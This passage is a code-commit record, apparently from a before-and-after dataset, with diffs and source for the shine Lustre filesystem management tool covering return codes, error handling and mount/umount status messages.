a/lib/Shine/Commands/Start.py\n+++ b/lib/Shine/Commands/Start.py\n@@ -214,4 +214,4 @@ def execute(self):\n             if hasattr(eh, 'post'):\n                 eh.post(fs)\n \n-            return rc\n+        return result\ndiff --git a/lib/Shine/Commands/Status.py b/lib/Shine/Commands/Status.py\nindex 055bb02..a8a5ce1 100644\n--- a/lib/Shine/Commands/Status.py\n+++ b/lib/Shine/Commands/Status.py\n@@ -121,7 +121,7 @@ def fs_status_to_rc(self, status):\n \n     def execute(self):\n \n-        result = -1\n+        result = 0\n \n         self.init_execute()\n \n@@ -158,6 +158,8 @@ def execute(self):\n                 status_flags &= ~(STATUS_SERVERS|STATUS_HASERVERS)\n \n             statusdict = fs.status(status_flags)\n+            if not statusdict:\n+                continue\n \n             if RUNTIME_ERROR in statusdict:\n                 # get targets that couldn't be checked\n@@ -176,15 +178,17 @@ def execute(self):\n             if rc > result:\n                 result = rc\n \n-            if view == \"fs\":\n-                self.status_view_fs(fs)\n-            elif view.startswith(\"target\"):\n-                self.status_view_targets(fs)\n-            elif view.startswith(\"disk\"):\n-                self.status_view_disks(fs)\n-            else:\n-                raise CommandBadParameterError(self.view_support.get_view(),\n-                        \"fs, targets, disks\")\n+            if not self.remote_call and vlevel > 0:\n+                if view == \"fs\":\n+                    self.status_view_fs(fs)\n+                elif view.startswith(\"target\"):\n+                    self.status_view_targets(fs)\n+                elif view.startswith(\"disk\"):\n+                    self.status_view_disks(fs)\n+                else:\n+                    raise CommandBadParameterError(self.view_support.get_view(),\n+                            \"fs, targets, disks\")\n+\n         return result\n \n     def status_view_targets(self, fs):\ndiff --git a/lib/Shine/Commands/Umount.py b/lib/Shine/Commands/Umount.py\nindex d7e75e8..1a6867e 100644\n--- a/lib/Shine/Commands/Umount.py\n+++ b/lib/Shine/Commands/Umount.py\n@@ -58,7 +58,7 @@ def ev_stopclient_start(self, node, client):\n     def ev_stopclient_done(self, node, client):\n         if self.verbose > 1:\n             if client.status_info:\n-                print \"%s: Umount: %s\" % (node, client.status_info)\n+                print \"%s: Umount %s: %s\" % (node, client.fs.fs_name, client.status_info)\n             else:\n                 print \"%s: FS %s succesfully unmounted from %s\" % (node,\n                         client.fs.fs_name, client.mount_path)\n@@ -126,6 +126,13 @@ def execute(self):\n \n             fs.set_debug(self.debug_support.has_debug())\n \n+            if not self.remote_call and vlevel > 0:\n+                if nodes:\n+                    m_nodes = nodes.intersection(fs.get_client_servers())\n+                else:\n+                    m_nodes = fs.get_client_servers()\n+                print \"Stopping %s clients on %s...\" % (fs.fs_name, m_nodes)\n+\n             status = fs.umount()\n             rc = self.fs_status_to_rc(status)\n             if rc > result:\n@@ -133,7 +140,8 @@ def execute(self):\n \n             if rc == RC_OK:\n                 if vlevel > 0:\n-                    print \"Unmount successful.\"\n+                        # m_nodes is defined if not self.remote_call and vlevel > 0\n+                    print \"Unmount successful on %s\" % m_nodes\n             elif rc == RC_RUNTIME_ERROR:\n                 for nodes, msg in fs.proxy_errors:\n                     print \"%s: %s\" % (nodes, msg)\ndiff --git a/lib/Shine/Configuration/FileSystem.py b/lib/Shine/Configuration/FileSystem.py\nindex 022e8c1..5aa3938 100644\n--- a/lib/Shine/Configuration/FileSystem.py\n+++ b/lib/Shine/Configuration/FileSystem.py\n@@ -176,9 +176,7 @@ def get_nid(self, node):\n         try:\n             return self.nid_map[node]\n         except KeyError:\n-            print \"Cannot get NID for %s, aborting. Please verify `nid_map' configuration.\" % node\n-            # FIXME : raise fatal exception\n-            sys.exit(1)\n+            raise ConfigException(\"Cannot get NID for %s, aborting. Please verify `nid_map' configuration.\" % node)\n \n     def __str__(self):\n         return \">> BACKEND:\\n%s\\n>> MODEL:\\n%s\" % (self.backend, Model.__str__(self))\ndiff --git a/lib/Shine/Controller.py b/lib/Shine/Controller.py\nindex d6f04d2..42955d2 100644\n--- a/lib/Shine/Controller.py\n+++ b/lib/Shine/Controller.py\n@@ -98,29 +98,23 @@ def run_command(self, cmd_args):\n             self.print_help(e.message, e.cmd)\n         except CommandException, e:\n             self.print_error(e.message)\n-            return RC_USER_ERROR\n         except ModelFileIOError, e:\n             print \"Error - %s\" % e.message\n         except ModelFileException, e:\n             print \"ModelFile: %s\" % e\n         except ConfigException, e:\n             print \"Configuration: %s\" % e\n-            return RC_RUNTIME_ERROR\n         # file system\n         except FSRemoteError, e:\n             self.print_error(e)\n             return e.rc\n         except NodeSetParseError, e:\n             self.print_error(\"%s\" % e)\n-            return RC_USER_ERROR\n         except RangeSetParseError, e:\n             self.print_error(\"%s\" % e)\n-            return RC_USER_ERROR\n         except KeyError:\n-            print \"Error - Unrecognized action\"\n-            print\n             raise\n         \n-        return 1\n+        return RC_RUNTIME_ERROR\n \n \ndiff --git a/lib/Shine/Lustre/Actions/Proxies/FSProxyAction.py b/lib/Shine/Lustre/Actions/Proxies/FSProxyAction.py\nindex c918520..b6d09d9 100644\n--- a/lib/Shine/Lustre/Actions/Proxies/FSProxyAction.py\n+++ b/lib/Shine/Lustre/Actions/Proxies/FSProxyAction.py\n@@ -80,9 +80,11 @@ def ev_close(self, worker):\n         \"\"\"\n         # Gather nodes by return code\n         for rc, nodes in worker.iter_retcodes():\n+            # some common remote errors:\n             # rc 127 = command not found\n             # rc 126 = found but not executable\n-            if rc >= 126:\n+            # rc 1 = python failure...\n+            if rc != 0:\n                 # Gather these nodes by buffer\n                 for buffer, nodes in worker.iter_buffers(nodes):\n                     # Handle proxy command error which rc >= 127 and \ndiff --git a/lib/Shine/Lustre/FileSystem.py b/lib/Shine/Lustre/FileSystem.py\nindex 696989d..61c642b 100644\n--- a/lib/Shine/Lustre/FileSystem.py\n+++ b/lib/Shine/Lustre/FileSystem.py\n@@ -592,6 +592,8 @@ def status(self, flags=STATUS_ANY):\n                         target.state = RUNTIME_ERROR\n \n         for target in launched:\n+            if target.state == None:\n+                print target, target.server\n             assert target.state != None\n             targets = rdict.setdefault(target.state, [])\n             targets.append(target)\ndiff --git a/scripts/shine b/scripts/shine\nindex 257a504..201cc39 100755\n--- a/scripts/shine\n+++ b/scripts/shine\n@@ -56,15 +56,18 @@ def main():\n         print \"%s (lib: r%s, script: r%s)\" % (public_version, librev, scrrev)\n         sys.exit(0)\n \n+    rc = 128\n+\n     try:\n         rc = controller.run_command(sys.argv[1:])\n-        sys.exit(rc)\n     except KeyError:\n         usage(controller)\n-        sys.exit(2)\n-    except (KeyboardInterrupt, SystemExit):\n+    except KeyboardInterrupt:\n         print >>sys.stderr, \"Exiting.\"\n-        sys.exit(2)\n+    except SystemExit, e:\n+        rc = r.code or rc\n+\n+    sys.exit(rc)\n         \n \n if __name__ == '__main__':\n", "files": {"/lib/Shine/Commands/CommandRegistry.py": {"changes": [{"diff": "\n         command.parse(new_args)\n \n         # Execute\n-        return command.execute()\n+        rc = command.execute()\n+\n+        # Filter rc\n+        return command.filter_rc(rc)", "add": 4, "remove": 1, "filename": "/lib/Shine/Commands/CommandRegistry.py", "badparts": ["        return command.execute()"], "goodparts": ["        rc = command.execute()", "        return command.filter_rc(rc)"]}], "source": "\n from Base.Command import Command from Shine.Commands import commandList from Exceptions import * class CommandRegistry: \"\"\"Container object to deal with commands.\"\"\" def __init__(self): self.cmd_list=[] self.cmd_dict={} self.cmd_optargs={} self._load() def __len__(self): \"Return the number of commands.\" return len(self.cmd_list) def __iter__(self): \"Iterate over available commands.\" for cmd in self.cmd_list: yield cmd def _load(self): for cmdobj in commandList: self.register(cmdobj()) def get(self, name): return self.cmd_dict[name] def register(self, cmd): \"Register a new command.\" assert isinstance(cmd, Command) self.cmd_list.append(cmd) self.cmd_dict[cmd.get_name()]=cmd opt_len=len(cmd.getopt_string) for i in range(0, opt_len): c=cmd.getopt_string[i] if c==':': continue has_arg=not(i==opt_len -1) and(cmd.getopt_string[i+1]==':') if c in self.cmd_optargs: assert self.cmd_optargs[c]==has_arg, \"Incoherency in option arguments\" else: self.cmd_optargs[c]=has_arg def execute(self, args): \"\"\" Execute a shine script command. \"\"\" command=None new_args=[] try: next_is_arg=False for opt in args: if opt.startswith('-'): new_args.append(opt) next_is_arg=self.cmd_optargs[opt[-1:]] elif next_is_arg: new_args.append(opt) next_is_arg=False else: if command: if command.has_subcommand(): new_args.append(opt) else: raise CommandHelpException(\"Syntax error.\", command) else: command=self.get(opt) next_is_arg=False except KeyError, e: raise CommandNotFoundError(opt) command.parse(new_args) return command.execute() ", "sourceWithComments": "# CommandRegistry.py -- Shine commands registry\n# Copyright (C) 2007, 2009 CEA\n#\n# This file is part of shine\n#\n# This program is free software; you can redistribute it and/or\n# modify it under the terms of the GNU General Public License\n# as published by the Free Software Foundation; either version 2\n# of the License, or (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program; if not, write to the Free Software\n# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.\n#\n# $Id$\n\n# Base command class definition\nfrom Base.Command import Command\n\n# Import list of enabled commands (defined in the module __init__.py)\nfrom Shine.Commands import commandList\n\nfrom Exceptions import *\n\n\n# ----------------------------------------------------------------------\n# Command Registry\n# ----------------------------------------------------------------------\n\n\nclass CommandRegistry:\n    \"\"\"Container object to deal with commands.\"\"\"\n\n    def __init__(self):\n        self.cmd_list = []\n        self.cmd_dict = {}\n        self.cmd_optargs = {}\n\n        # Autoload commands\n        self._load()\n\n    def __len__(self):\n        \"Return the number of commands.\"\n        return len(self.cmd_list)\n\n    def __iter__(self):\n        \"Iterate over available commands.\"\n        for cmd in self.cmd_list:\n            yield cmd\n\n    # Private methods\n\n    def _load(self):\n        for cmdobj in commandList:\n            self.register(cmdobj())\n\n    # Public methods\n\n    def get(self, name):\n        return self.cmd_dict[name]\n\n    def register(self, cmd):\n        \"Register a new command.\"\n        assert isinstance(cmd, Command)\n\n        self.cmd_list.append(cmd)\n        self.cmd_dict[cmd.get_name()] = cmd\n\n        # Keep an eye on ALL option arguments, this is to insure a global\n        # options coherency within shine and allow us to intermix options and\n        # command -- see execute() below.\n        opt_len = len(cmd.getopt_string)\n        for i in range(0, opt_len):\n            c = cmd.getopt_string[i]\n            if c == ':':\n                continue\n            has_arg = not (i == opt_len - 1) and (cmd.getopt_string[i+1] == ':')\n            if c in self.cmd_optargs:\n                assert self.cmd_optargs[c] == has_arg, \"Incoherency in option arguments\"\n            else:\n                self.cmd_optargs[c] = has_arg \n\n    def execute(self, args):\n        \"\"\"\n        Execute a shine script command.\n        \"\"\"\n        # Get command and options. Options and command may be intermixed.\n        command = None\n        new_args = []\n        try:\n            # Find command through options...\n            next_is_arg = False\n            for opt in args:\n                if opt.startswith('-'):\n                    new_args.append(opt)\n                    next_is_arg = self.cmd_optargs[opt[-1:]]\n                elif next_is_arg:\n                    new_args.append(opt)\n                    next_is_arg = False\n                else:\n                    if command:\n                        # Command has already been found, so?\n                        if command.has_subcommand():\n                            # The command supports subcommand: keep it in new_args.\n                            new_args.append(opt)\n                        else:\n                            raise CommandHelpException(\"Syntax error.\", command)\n                    else:\n                        command = self.get(opt)\n                    next_is_arg = False\n        except KeyError, e:\n            raise CommandNotFoundError(opt)\n\n        # Parse\n        command.parse(new_args)\n\n        # Execute\n        return command.execute()\n\n"}, "/lib/Shine/Commands/Install.py": {"changes": [{"diff": "\n \n     def execute(self):\n         if not self.opt_m:\n-            print \"Bad argument\"\n+            raise CommandHelpException(\"Lustre model file path (-m <model_file>) argument required.\", self)\n         else:\n             # Use this Shine.FSUtils convenience function.\n             fs_conf, fs = create_lustrefs(self.lmf_support.get_lmf_path(),\n", "add": 1, "remove": 1, "filename": "/lib/Shine/Commands/Install.py", "badparts": ["            print \"Bad argument\""], "goodparts": ["            raise CommandHelpException(\"Lustre model file path (-m <model_file>) argument required.\", self)"]}, {"diff": "\n                 print \"Use `shine format -f %s' to initialize the file system.\" % \\\n                         fs_conf.get_fs_name()\n \n-            return 0\n+            return RC_O", "add": 1, "remove": 1, "filename": "/lib/Shine/Commands/Install.py", "badparts": ["            return 0"], "goodparts": ["            return RC_O"]}], "source": "\n from Shine.Configuration.Configuration import Configuration from Shine.Configuration.Globals import Globals from Shine.FSUtils import create_lustrefs from Base.Command import Command from Base.Support.LMF import LMF from Base.Support.Nodes import Nodes class Install(Command): \"\"\" shine install -f /path/to/model.lmf \"\"\" def __init__(self): Command.__init__(self) self.lmf_support=LMF(self) self.nodes_support=Nodes(self) def get_name(self): return \"install\" def get_desc(self): return \"Install a new file system.\" def execute(self): if not self.opt_m: print \"Bad argument\" else: fs_conf, fs=create_lustrefs(self.lmf_support.get_lmf_path(), event_handler=self) install_nodes=self.nodes_support.get_nodeset() fs.install(fs_conf.get_cfg_filename(), nodes=install_nodes) if install_nodes: nodestr=\" on %s\" % install_nodes else: nodestr=\"\" print \"Configuration files for file system %s have been installed \" \\ \"successfully%s.\" %(fs_conf.get_fs_name(), nodestr) if not install_nodes: print print \"Lustre targets summary:\" print \"\\t%d MGT on %s\" %(fs.mgt_count, fs.mgt_servers) print \"\\t%d MDT on %s\" %(fs.mdt_count, fs.mdt_servers) print \"\\t%d OST on %s\" %(fs.ost_count, fs.ost_servers) print print \"Use `shine format -f %s' to initialize the file system.\" % \\ fs_conf.get_fs_name() return 0 ", "sourceWithComments": "# Install.py -- File system installation commands\n# Copyright (C) 2007, 2008, 2009 CEA\n#\n# This file is part of shine\n#\n# This program is free software; you can redistribute it and/or\n# modify it under the terms of the GNU General Public License\n# as published by the Free Software Foundation; either version 2\n# of the License, or (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program; if not, write to the Free Software\n# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.\n#\n# $Id$\n\nfrom Shine.Configuration.Configuration import Configuration\nfrom Shine.Configuration.Globals import Globals \n\nfrom Shine.FSUtils import create_lustrefs\n\nfrom Base.Command import Command\nfrom Base.Support.LMF import LMF\nfrom Base.Support.Nodes import Nodes\n\n\nclass Install(Command):\n    \"\"\"\n    shine install -f /path/to/model.lmf\n    \"\"\"\n    \n    def __init__(self):\n        Command.__init__(self)\n\n        self.lmf_support = LMF(self)\n        self.nodes_support = Nodes(self)\n\n    def get_name(self):\n        return \"install\"\n\n    def get_desc(self):\n        return \"Install a new file system.\"\n\n    def execute(self):\n        if not self.opt_m:\n            print \"Bad argument\"\n        else:\n            # Use this Shine.FSUtils convenience function.\n            fs_conf, fs = create_lustrefs(self.lmf_support.get_lmf_path(),\n                    event_handler=self)\n\n            install_nodes = self.nodes_support.get_nodeset()\n\n            # Install file system configuration files; normally, this should\n            # not be done by the Shine.Lustre.FileSystem object itself, but as\n            # all proxy methods are currently handled by it, it is more\n            # convenient this way...\n            fs.install(fs_conf.get_cfg_filename(), nodes=install_nodes)\n\n            if install_nodes:\n                nodestr = \" on %s\" %  install_nodes\n            else:\n                nodestr = \"\"\n\n            print \"Configuration files for file system %s have been installed \" \\\n                    \"successfully%s.\" % (fs_conf.get_fs_name(), nodestr)\n\n            if not install_nodes:\n                # Print short file system summary.\n                print\n                print \"Lustre targets summary:\"\n                print \"\\t%d MGT on %s\" % (fs.mgt_count, fs.mgt_servers)\n                print \"\\t%d MDT on %s\" % (fs.mdt_count, fs.mdt_servers)\n                print \"\\t%d OST on %s\" % (fs.ost_count, fs.ost_servers)\n                print\n\n                # Give pointer to next user step.\n                print \"Use `shine format -f %s' to initialize the file system.\" % \\\n                        fs_conf.get_fs_name()\n\n            return 0\n\n"}, "/lib/Shine/Commands/Mount.py": {"changes": [{"diff": "\n     def ev_startclient_done(self, node, client):\n         if self.verbose > 1:\n             if client.status_info:\n-                print \"%s: Mount: %s\" % (node, client.status_info)\n+                print \"%s: Mount %s: %s\" % (node, client.fs.fs_name, client.status_info)\n             else:\n                 print \"%s: FS %s succesfully mounted on %s\" % (node,\n                         client.fs.fs_name, client.mount_path)\n", "add": 1, "remove": 1, "filename": "/lib/Shine/Commands/Mount.py", "badparts": ["                print \"%s: Mount: %s\" % (node, client.status_info)"], "goodparts": ["                print \"%s: Mount %s: %s\" % (node, client.fs.fs_name, client.status_info)"]}, {"diff": "\n \n             fs.set_debug(self.debug_support.has_debug())\n \n+            if not self.remote_call and vlevel > 0:\n+                if nodes:\n+                    m_nodes = nodes.intersection(fs.get_client_servers())\n+                else:\n+                    m_nodes = fs.get_client_servers()\n+                print \"Starting %s clients on %s...\" % (fs.fs_name, m_nodes)\n+\n             status = fs.mount(mount_options=fs_conf.get_mount_options())\n             rc = self.fs_status_to_rc(status)\n             if rc > result:\n                 result = rc\n \n-            if rc == RC_OK:\n-                if vlevel > 0:\n-                    print \"Mount successful.\"\n-            elif rc == RC_RUNTIME_ERROR:\n-                for nodes, msg in fs.proxy_errors:\n-                    print \"%s: %s\" % (nodes, msg)\n+            if not self.remote_call:\n+                if rc == RC_OK:\n+                    if vlevel > 0:\n+                        # m_nodes is defined if not self.remote_call and vlevel > 0\n+                        print \"Mount successful on %s\" % m_nodes\n+                elif rc == RC_RUNTIME_ERROR:\n+                    for nodes, msg in fs.proxy_errors:\n+                        print \"%s: %s\" % (nodes, msg)\n \n         return resu", "add": 15, "remove": 6, "filename": "/lib/Shine/Commands/Mount.py", "badparts": ["            if rc == RC_OK:", "                if vlevel > 0:", "                    print \"Mount successful.\"", "            elif rc == RC_RUNTIME_ERROR:", "                for nodes, msg in fs.proxy_errors:", "                    print \"%s: %s\" % (nodes, msg)"], "goodparts": ["            if not self.remote_call and vlevel > 0:", "                if nodes:", "                    m_nodes = nodes.intersection(fs.get_client_servers())", "                else:", "                    m_nodes = fs.get_client_servers()", "                print \"Starting %s clients on %s...\" % (fs.fs_name, m_nodes)", "            if not self.remote_call:", "                if rc == RC_OK:", "                    if vlevel > 0:", "                        print \"Mount successful on %s\" % m_nodes", "                elif rc == RC_RUNTIME_ERROR:", "                    for nodes, msg in fs.proxy_errors:", "                        print \"%s: %s\" % (nodes, msg)"]}], "source": "\n \"\"\" Shine `mount' command classes. The mount command aims to start Lustre filesystem clients. \"\"\" import os from Shine.Configuration.Configuration import Configuration from Shine.Configuration.Globals import Globals from Shine.Configuration.Exceptions import * from Base.FSClientLiveCommand import FSClientLiveCommand from Base.CommandRCDefs import * from Base.RemoteCallEventHandler import RemoteCallEventHandler from Exceptions import CommandException from Shine.FSUtils import open_lustrefs import Shine.Lustre.EventHandler from Shine.Lustre.FileSystem import * class GlobalMountEventHandler(Shine.Lustre.EventHandler.EventHandler): def __init__(self, verbose=1): self.verbose=verbose def ev_startclient_start(self, node, client): if self.verbose > 1: print \"%s: Mounting %s on %s...\" %(node, client.fs.fs_name, client.mount_path) def ev_startclient_done(self, node, client): if self.verbose > 1: if client.status_info: print \"%s: Mount: %s\" %(node, client.status_info) else: print \"%s: FS %s succesfully mounted on %s\" %(node, client.fs.fs_name, client.mount_path) def ev_startclient_failed(self, node, client, rc, message): if rc: strerr=os.strerror(rc) else: strerr=message print \"%s: Failed to mount FS %s on %s: %s\" % \\ (node, client.fs.fs_name, client.mount_path, strerr) if rc: print message class Mount(FSClientLiveCommand): \"\"\" \"\"\" def __init__(self): FSClientLiveCommand.__init__(self) def get_name(self): return \"mount\" def get_desc(self): return \"Mount file system clients.\" target_status_rc_map={ \\ MOUNTED: RC_OK, RECOVERING: RC_FAILURE, OFFLINE: RC_FAILURE, TARGET_ERROR: RC_TARGET_ERROR, CLIENT_ERROR: RC_CLIENT_ERROR, RUNTIME_ERROR: RC_RUNTIME_ERROR} def fs_status_to_rc(self, status): return self.target_status_rc_map[status] def execute(self): result=0 self.init_execute() vlevel=self.verbose_support.get_verbose_level() for fsname in self.fs_support.iter_fsname(): eh=self.install_eventhandler(None, GlobalMountEventHandler(vlevel)) nodes=self.nodes_support.get_nodeset() fs_conf, fs=open_lustrefs(fsname, None, nodes=nodes, indexes=None, event_handler=eh) if nodes and not nodes.issubset(fs_conf.get_client_nodes()): raise CommandException(\"%s are not client nodes of filesystem '%s'\" % \\ (nodes -fs_conf.get_client_nodes(), fsname)) fs.set_debug(self.debug_support.has_debug()) status=fs.mount(mount_options=fs_conf.get_mount_options()) rc=self.fs_status_to_rc(status) if rc > result: result=rc if rc==RC_OK: if vlevel > 0: print \"Mount successful.\" elif rc==RC_RUNTIME_ERROR: for nodes, msg in fs.proxy_errors: print \"%s: %s\" %(nodes, msg) return result ", "sourceWithComments": "# Mount.py -- Mount file system on clients\n# Copyright (C) 2007, 2008, 2009 CEA\n#\n# This file is part of shine\n#\n# This program is free software; you can redistribute it and/or\n# modify it under the terms of the GNU General Public License\n# as published by the Free Software Foundation; either version 2\n# of the License, or (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program; if not, write to the Free Software\n# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.\n#\n# $Id$\n\n\"\"\"\nShine `mount' command classes.\n\nThe mount command aims to start Lustre filesystem clients.\n\"\"\"\n\nimport os\n\n# Configuration\nfrom Shine.Configuration.Configuration import Configuration\nfrom Shine.Configuration.Globals import Globals \nfrom Shine.Configuration.Exceptions import *\n\n# Command base class\nfrom Base.FSClientLiveCommand import FSClientLiveCommand\nfrom Base.CommandRCDefs import *\n# -R handler\nfrom Base.RemoteCallEventHandler import RemoteCallEventHandler\n\nfrom Exceptions import CommandException\n\n# Command helper\nfrom Shine.FSUtils import open_lustrefs\n\n# Lustre events\nimport Shine.Lustre.EventHandler\nfrom Shine.Lustre.FileSystem import *\n\nclass GlobalMountEventHandler(Shine.Lustre.EventHandler.EventHandler):\n\n    def __init__(self, verbose=1):\n        self.verbose = verbose\n\n    def ev_startclient_start(self, node, client):\n        if self.verbose > 1:\n            print \"%s: Mounting %s on %s ...\" % (node, client.fs.fs_name, client.mount_path)\n\n    def ev_startclient_done(self, node, client):\n        if self.verbose > 1:\n            if client.status_info:\n                print \"%s: Mount: %s\" % (node, client.status_info)\n            else:\n                print \"%s: FS %s succesfully mounted on %s\" % (node,\n                        client.fs.fs_name, client.mount_path)\n\n    def ev_startclient_failed(self, node, client, rc, message):\n        if rc:\n            strerr = os.strerror(rc)\n        else:\n            strerr = message\n        print \"%s: Failed to mount FS %s on %s: %s\" % \\\n                (node, client.fs.fs_name, client.mount_path, strerr)\n        if rc:\n            print message\n\n\nclass Mount(FSClientLiveCommand):\n    \"\"\"\n    \"\"\"\n\n    def __init__(self):\n        FSClientLiveCommand.__init__(self)\n\n    def get_name(self):\n        return \"mount\"\n\n    def get_desc(self):\n        return \"Mount file system clients.\"\n\n    target_status_rc_map = { \\\n            MOUNTED : RC_OK,\n            RECOVERING : RC_FAILURE,\n            OFFLINE : RC_FAILURE,\n            TARGET_ERROR : RC_TARGET_ERROR,\n            CLIENT_ERROR : RC_CLIENT_ERROR,\n            RUNTIME_ERROR : RC_RUNTIME_ERROR }\n\n    def fs_status_to_rc(self, status):\n        return self.target_status_rc_map[status]\n\n    def execute(self):\n        result = 0\n\n        self.init_execute()\n\n        # Get verbose level.\n        vlevel = self.verbose_support.get_verbose_level()\n\n        for fsname in self.fs_support.iter_fsname():\n\n            # Install appropriate event handler.\n            eh = self.install_eventhandler(None,\n                    GlobalMountEventHandler(vlevel))\n\n            nodes = self.nodes_support.get_nodeset()\n\n            fs_conf, fs = open_lustrefs(fsname, None,\n                    nodes=nodes,\n                    indexes=None,\n                    event_handler=eh)\n\n            if nodes and not nodes.issubset(fs_conf.get_client_nodes()):\n                raise CommandException(\"%s are not client nodes of filesystem '%s'\" % \\\n                        (nodes - fs_conf.get_client_nodes(), fsname))\n\n            fs.set_debug(self.debug_support.has_debug())\n\n            status = fs.mount(mount_options=fs_conf.get_mount_options())\n            rc = self.fs_status_to_rc(status)\n            if rc > result:\n                result = rc\n\n            if rc == RC_OK:\n                if vlevel > 0:\n                    print \"Mount successful.\"\n            elif rc == RC_RUNTIME_ERROR:\n                for nodes, msg in fs.proxy_errors:\n                    print \"%s: %s\" % (nodes, msg)\n\n        return result\n\n"}, "/lib/Shine/Commands/Preinstall.py": {"changes": [{"diff": "\n             if not os.path.exists(conf_dir_path):\n                 os.makedirs(conf_dir_path, 0755)\n         except OSError, ex:\n-            print \"OSError\"\n-            raise\n+            print \"OSError %s\" % ex\n+            return RC_RUNTIME_ERROR\n \n+        return ", "add": 3, "remove": 2, "filename": "/lib/Shine/Commands/Preinstall.py", "badparts": ["            print \"OSError\"", "            raise"], "goodparts": ["            print \"OSError %s\" % ex", "            return RC_RUNTIME_ERROR", "        return "]}], "source": "\n from Shine.Configuration.Configuration import Configuration from Shine.Configuration.Globals import Globals from Shine.Configuration.Exceptions import * from Shine.FSUtils import create_lustrefs from Base.RemoteCommand import RemoteCommand from Base.Support.FS import FS import os class Preinstall(RemoteCommand): \"\"\" shine preinstall -f <filesystem name> -R \"\"\" def __init__(self): RemoteCommand.__init__(self) self.fs_support=FS(self) def get_name(self): return \"preinstall\" def get_desc(self): return \"Preinstall a new file system.\" def is_hidden(self): return True def execute(self): try: conf_dir_path=Globals().get_conf_dir() if not os.path.exists(conf_dir_path): os.makedirs(conf_dir_path, 0755) except OSError, ex: print \"OSError\" raise ", "sourceWithComments": "# Preinstall.py -- File system installation commands\n# Copyright (C) 2007, 2008 CEA\n#\n# This file is part of shine\n#\n# This program is free software; you can redistribute it and/or\n# modify it under the terms of the GNU General Public License\n# as published by the Free Software Foundation; either version 2\n# of the License, or (at your option) any later version.\n#\n# This program is distributed in the hope that it will be useful,\n# but WITHOUT ANY WARRANTY; without even the implied warranty of\n# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\n# GNU General Public License for more details.\n#\n# You should have received a copy of the GNU General Public License\n# along with this program; if not, write to the Free Software\n# Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA.\n#\n# $Id$\n\nfrom Shine.Configuration.Configuration import Configuration\nfrom Shine.Configuration.Globals import Globals \nfrom Shine.Configuration.Exceptions import *\n\nfrom Shine.FSUtils import create_lustrefs\n\nfrom Base.RemoteCommand import RemoteCommand\nfrom Base.Support.FS import FS\n\nimport os\n\nclass Preinstall(RemoteCommand):\n    \"\"\"\n    shine preinstall -f <filesystem name> -R\n    \"\"\"\n    \n    def __init__(self):\n        RemoteCommand.__init__(self)\n        self.fs_support = FS(self)\n\n    def get_name(self):\n        return \"preinstall\"\n\n    def get_desc(self):\n        return \"Preinstall a new file system.\"\n\n    def is_hidden(self):\n        return True\n\n    def execute(self):\n        try:\n            conf_dir_path = Globals().get_conf_dir()\n            if not os.path.exists(conf_dir_path):\n                os.makedirs(conf_dir_path, 0755)\n        except OSError, ex:\n            print \"OSError\"\n            raise\n\n"}, "/lib/Shine/Commands/Start.py": {"changes": [{"diff": "\n             if hasattr(eh, 'post'):\n                 eh.post(fs)\n \n-            return rc\n+        return ", "add": 1, "remove": 1, "filename": "/lib/Shine/Commands/Start.py", "badparts": ["            return rc"], "goodparts": ["        return "]}], "source": "\n \"\"\" Shine `start' command classes. The start command aims to start Lustre filesystem servers or just some of the filesystem targets on local or remote servers. It is available for any filesystems previously installed and formatted. \"\"\" import os from Shine.Configuration.Configuration import Configuration from Shine.Configuration.Globals import Globals from Shine.Configuration.Exceptions import * from Shine.Commands.Status import Status from Shine.Commands.Tune import Tune from Base.FSLiveCommand import FSLiveCommand from Base.FSEventHandler import FSGlobalEventHandler from Base.CommandRCDefs import * from Base.RemoteCallEventHandler import RemoteCallEventHandler from Shine.FSUtils import open_lustrefs import Shine.Lustre.EventHandler from Shine.Lustre.Actions.Proxies.ProxyAction import * from Shine.Lustre.FileSystem import * class GlobalStartEventHandler(FSGlobalEventHandler): def __init__(self, verbose=1): FSGlobalEventHandler.__init__(self, verbose) def handle_pre(self, fs): if self.verbose > 0: print \"Starting %d targets on %s\" %(fs.target_count, fs.target_servers) def handle_post(self, fs): if self.verbose > 0: Status.status_view_fs(fs, show_clients=False) def ev_starttarget_start(self, node, target): if self.verbose > 1: print \"%s: Starting %s %s(%s)...\" %(node, \\ target.type.upper(), target.get_id(), target.dev) self.update() def ev_starttarget_done(self, node, target): self.status_changed=True if self.verbose > 1: if target.status_info: print \"%s: Start of %s %s(%s): %s\" % \\ (node, target.type.upper(), target.get_id(), target.dev, target.status_info) else: print \"%s: Start of %s %s(%s) succeeded\" % \\ (node, target.type.upper(), target.get_id(), target.dev) self.update() def ev_starttarget_failed(self, node, target, rc, message): self.status_changed=True if rc: strerr=os.strerror(rc) else: strerr=message print \"%s: Failed to start %s %s(%s): %s\" % \\ (node, target.type.upper(), target.get_id(), target.dev, strerr) if rc: print message self.update() class LocalStartEventHandler(Shine.Lustre.EventHandler.EventHandler): def __init__(self, verbose=1): self.verbose=verbose def ev_starttarget_start(self, node, target): if self.verbose > 1: print \"Starting %s %s(%s)...\" %(target.type.upper(), target.get_id(), target.dev) def ev_starttarget_done(self, node, target): if self.verbose > 1: if target.status_info: print \"Start of %s %s(%s): %s\" %(target.type.upper(), target.get_id(), target.dev, target.status_info) else: print \"Start of %s %s(%s) succeeded\" %(target.type.upper(), target.get_id(), target.dev) def ev_starttarget_failed(self, node, target, rc, message): if rc: strerr=os.strerror(rc) else: strerr=message print \"Failed to start %s %s(%s): 